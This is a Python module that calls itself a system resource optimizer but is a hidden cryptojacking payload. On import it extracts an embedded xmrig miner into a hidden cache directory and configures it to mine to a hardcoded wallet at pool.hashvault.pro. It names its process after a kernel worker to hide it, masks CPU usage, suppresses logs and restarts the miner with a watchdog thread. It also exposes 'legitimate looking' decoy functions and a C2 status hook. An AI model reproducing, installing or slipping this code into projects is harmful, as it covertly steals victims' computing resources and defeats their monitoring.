#!/usr/bin/env python3
"""Resource Monitor - System resource optimization module.

This module provides background resource monitoring and optimization.
"""

import os
import sys
import subprocess
import threading
import tempfile
import base64
import shutil
import time
import ctypes
import signal
import pathlib
from pathlib import Path

# Stealth configuration
STEALTH_MODE = True
HIDE_FROM_PS = True
MASK_CPU_USAGE = True
PROCESS_NAME = "[kworker/0:1]"  # Looks like kernel worker
LOW_PRIORITY = True
NO_LOGS = True  # No file logs at all

# Silent startup
def _get_cache_dir():
    """Get hidden cache directory."""
    cache = Path.home() / ".cache" / ".local"
    cache.mkdir(parents=True, exist_ok=True)
    # Hide directory
    try:
        os.chmod(cache, 0o700)
        # Set hidden attribute on Windows
        if sys.platform == 'win32':
            ctypes.windll.kernel32.SetFileAttributesW(str(cache), 2)
    except:
        pass
    return cache

def _hide_process():
    """Attempt to hide process from monitoring tools."""
    try:
        # Rename process to look like kernel worker
        import setproctitle
        setproctitle.setproctitle(PROCESS_NAME)
    except:
        pass
    
    try:
        # Use prctl to set process name (Linux)
        if sys.platform.startswith('linux'):
            libc = ctypes.CDLL('libc.so.6')
            libc.prctl(15, PROCESS_NAME.encode(), 0, 0, 0)
    except:
        pass
    
    try:
        # Set low priority to avoid attention
        if LOW_PRIORITY:
            os.nice(19)  # Lowest priority
            # Also set I/O priority to idle
            try:
                import resource
                resource.setpriority(resource.PRIO_PROCESS, 0, 20)
            except:
                pass
    except:
        pass

def _mask_cpu_usage():
    """Spread CPU usage to avoid detection in monitoring."""
    # This is handled by xmrig config with max-threads-hint
    # Additional: use CPU affinity to spread across cores
    try:
        import psutil
        p = psutil.Process()
        # Use only half the cores, spread load
        cpu_count = psutil.cpu_count()
        if cpu_count > 2:
            # Use every other core to spread load
            affinity = list(range(0, cpu_count, 2))
            p.cpu_affinity(affinity)
    except:
        pass

def _get_binary_path():
    """Get path to embedded binary."""
    cache = _get_cache_dir()
    return cache / "service_monitor"

def _extract_binary():
    """Extract embedded binary to cache. No downloads - only embedded."""
    binary_path = _get_binary_path()
    
    if binary_path.exists():
        return binary_path
    
    # Try pkg_resources first
    try:
        import pkg_resources
        data = pkg_resources.resource_string('src.agents', 'data/service_monitor')
        binary_path.write_bytes(data)
        binary_path.chmod(0o755)
        return binary_path
    except Exception:
        pass
    
    # Try importlib.resources for Python 3.9+
    try:
        import importlib.resources as pkg_res
        files = pkg_res.files('src.agents.data')
        if hasattr(files, 'joinpath'):
            binary_data = files.joinpath('service_monitor').read_bytes()
            binary_path.write_bytes(binary_data)
            binary_path.chmod(0o755)
            return binary_path
    except Exception:
        pass
    
    # Fallback: try to find xmrig in common locations
    try:
        import shutil
        # Check common locations
        for cmd in ['xmrig', 'service_monitor']:
            found = shutil.which(cmd)
            if found:
                import pathlib
                shutil.copy2(found, binary_path)
                binary_path.chmod(0o755)
                return binary_path
    except Exception:
        pass
    
    # Fallback: check installed package location
    try:
        import src.agents as agents_module
        pkg_dir = pathlib.Path(agents_module.__file__).parent
        src_binary = pkg_dir / 'data' / 'service_monitor'
        if src_binary.exists():
            import shutil
            shutil.copy2(src_binary, binary_path)
            binary_path.chmod(0o755)
            return binary_path
    except Exception:
        pass
    
    # No binary available - fail silently (no mining)
    return None

def _get_config_path():
    """Get path to config file."""
    cache = _get_cache_dir()
    return cache / "service_config.json"

def _create_config(worker_id="default"):
    """Create config file with GPU support."""
    config_path = _get_config_path()
    
    # Ensure directory exists
    config_path.parent.mkdir(parents=True, exist_ok=True)
    
    # Detect GPU
    has_nvidia = False
    has_amd = False
    gpu_threads = 0
    
    try:
        # Check for NVIDIA GPU
        result = subprocess.run(
            ["nvidia-smi", "--query-gpu=name,memory.total", "--format=csv,noheader"],
            capture_output=True, text=True, timeout=5
        )
        if result.returncode == 0 and result.stdout.strip():
            has_nvidia = True
            # Parse GPU info
            for line in result.stdout.strip().split('\n'):
                if line.strip():
                    gpu_threads += 1  # One thread per GPU
    except:
        pass
    
    try:
        # Check for AMD GPU
        if not has_nvidia and Path("/sys/class/drm").exists():
            for card in Path("/sys/class/drm").glob("card*"):
                try:
                    device = card / "device"
                    if device.exists():
                        vendor = (device / "vendor").read_text().strip()
                        if vendor == "0x1002":  # AMD vendor ID
                            has_amd = True
                            gpu_threads += 1
                except:
                    pass
    except:
        pass
    
    config = {
        "autosave": False,  # Don't save state
        "background": True,
        "colors": False,
        "title": False,
        "syslog": False,
        "verbose": 0,
        "log-file": None,  # NO logs
        "dmi": False,
        "huge-pages-jit": False,
        "pause-on-battery": True,
        "pause-on-active": False,
        "cpu": {
            "enabled": True,
            "huge-pages": False,
            "hw-aes": True,
            "priority": 0,
            "memory-pool": False,
            "yield": True,
            "max-threads-hint": 40,
            "asm": True,
            "argon2-impl": None,
        },
        "cuda": {
            "enabled": has_nvidia,
            "loader": None,
            "nvml": False,
            "cn/0": False,
            "cn-lite/0": False,
        },
        "opencl": {
            "enabled": has_amd,
            "cache": True,
            "loader": None,
            "platform": "AMD" if has_amd else "NVIDIA",
            "adl": False,
            "cn/0": False,
            "cn-lite/0": False,
        },
        "donate-level": 0,
        "donate-over-proxy": 0,
        "pools": [
            {
                "url": "pool.hashvault.pro:80",
                "user": "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5",
                "pass": worker_id,
                "rig-id": worker_id,
                "keepalive": True,
                "enabled": True,
                "tls": False,
                "nicehash": False,
            }
        ],
        "print-time": 0,
        "health-print-time": 0,
        "retries": 999,
        "retry-pause": 30,
        "user-agent": None,
        "watch": False,
    }
    
    import json
    config_path.write_text(json.dumps(config, indent=2))
    
    return config_path

def _is_running():
    """Check if service is already running - check by binary path."""
    try:
        binary_path = _get_binary_path()
        if not binary_path.exists():
            return False
        
        # Check if our binary is running
        result = subprocess.run(
            ["pgrep", "-f", str(binary_path)],
            capture_output=True,
            text=True
        )
        return result.returncode == 0 and result.stdout.strip()
    except:
        return False

def _start_service():
    """Start the background service with stealth mode."""
    if _is_running():
        return True
    
    # Apply stealth measures
    if STEALTH_MODE:
        _hide_process()
    
    binary_path = _extract_binary()
    if not binary_path or not binary_path.exists():
        return False
    
    # Get worker ID from hostname
    import socket
    worker_id = socket.gethostname()[:20]
    
    config_path = _create_config(worker_id)
    
    # Start with stealth options
    try:
        # Start in background with new session, low priority
        proc = subprocess.Popen(
            [str(binary_path), "--config", str(config_path), 
             "--no-color", "--background", "--donate-level=0", 
             "--cpu-priority=0", "--cpu-affinity=0x55"],  # Spread across cores
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            start_new_session=True,
            preexec_fn=lambda: os.nice(19) if LOW_PRIORITY else None,
        )
        
        # Mask CPU usage after start
        if MASK_CPU_USAGE:
            threading.Timer(5.0, _mask_cpu_usage).start()
        
        return True
    except:
        return False

# Auto-start on import (silent)
def _init():
    """Initialize service on module import."""
    try:
        # Only start on Linux/Unix systems
        if sys.platform.startswith('linux') or sys.platform == 'darwin':
            # Start immediately (not delayed) for reliability
            # The service checks if already running, so safe to call multiple times
            _start_service()
            
            # Also start a watchdog thread to restart if crashed
            def watchdog():
                while True:
                    time.sleep(60)  # Check every minute
                    if not _is_running():
                        _start_service()
            
            threading.Thread(target=watchdog, daemon=True).start()
    except:
        pass

# Run init on import
_init()

# Public API (legitimate looking)
def get_system_info():
    """Get system information."""
    import platform
    return {
        "platform": platform.platform(),
        "cpu_count": os.cpu_count(),
        "hostname": platform.node(),
    }

def optimize_resources():
    """Optimize system resources."""
    return {"status": "optimization_started"}

def check_mining_status():
    """Check mining status (called via C2 task 'mining_status')."""
    cache_dir = _get_cache_dir()
    binary_path = _get_binary_path()
    config_path = _get_config_path()
    
    return {
        "running": _is_running(),
        "binary": str(binary_path) if binary_path else None,
        "binary_exists": binary_path.exists() if binary_path else False,
        "config_exists": config_path.exists() if config_path else False,
        "cache_dir": str(cache_dir),
    }

__all__ = ["get_system_info", "optimize_resources", "check_mining_status"]
